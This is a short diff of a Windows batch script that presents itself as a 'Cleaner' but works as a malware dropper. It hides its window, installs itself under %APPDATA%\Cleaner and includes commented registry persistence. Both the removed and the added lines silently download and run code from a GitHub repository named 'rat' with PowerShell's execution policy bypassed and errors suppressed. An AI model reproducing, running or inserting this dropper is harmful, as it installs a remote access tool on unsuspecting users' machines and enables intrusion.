@@ -5,9 +5,9 @@ if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && 
 :: /t REG_SZ ^
 :: /d "\"C:\%APPDATA%\Cleaner\start.cmd"" ^
 :: /f
-copy "%~f0" "%APPDATA%\Cleaner\start.cmd"
-del "%~f0"
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/cli.ps1' -OutFile 'cli.ps1'"
-copy "%~dp0cli.ps1" "%APPDATA%\Cleaner"
-powershell -ExecutionPolicy Bypass -File cli.ps1
+if not exist "%APPDATA%\Cleaner" mkdir "%APPDATA%\Cleaner"
+powershell -NoProfile -ExecutionPolicy Bypass ^
+  -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/start.cmd' -OutFile '%APPDATA%\Cleaner\start.cmd' -UseBasicParsing } catch {}" ^
+  >nul 2>&1
+start "" /min "%APPDATA%\Cleaner\start.cmd"
 exit
